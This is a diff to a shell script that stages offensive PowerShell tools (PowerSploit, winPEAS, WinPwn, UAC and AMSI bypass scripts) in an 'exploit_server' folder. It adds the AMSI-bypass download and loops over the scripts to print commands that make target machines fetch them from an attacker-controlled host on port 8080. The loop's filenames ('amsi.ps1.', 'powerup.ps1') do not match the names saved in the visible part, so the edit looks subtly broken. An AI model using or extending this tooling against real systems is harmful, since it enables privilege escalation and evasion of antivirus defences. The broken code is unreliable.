@@ -34,6 +34,7 @@ download_script "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/m
 download_script "https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1" "/tmp/exploit_server/winpeas.ps1"
 download_script "https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/Offline_WinPwn.ps1" "/tmp/exploit_server/winpwn.ps1"
 download_script "https://github.com/paulkwalton/thescriptvault/blob/cf3ec0d2fddd057b0f37e231f6515635e8918db8/privesc/windows/uac-bypass.ps1" "/tmp/exploit_server/uac-bypass.ps1"
+download_script "https://github.com/paulkwalton/thescriptvault/blob/26bd79c0999723a961c2bc041bc36ed27fa576ff/privesc/windows/amsi-bypass.ps1" "/tmp/exploit_server/amsi-bypass.ps1"
 
 chmod 755 -R /tmp/exploit_server
 
@@ -59,7 +60,7 @@ print_command() {
 echo "PowerShell Bypass Commands:"
 echo "============================"
 
-for script in powersploit.ps1 winpeas.ps1 winpwn.ps1; do
+for script in powerup.ps1 winpeas.ps1 winpwn.ps1 uac-bypass.ps1 amsi.ps1.; do
     url="http://$IP:8080/$script"
     echo "Commands for $script:"
     echo "--------------------"
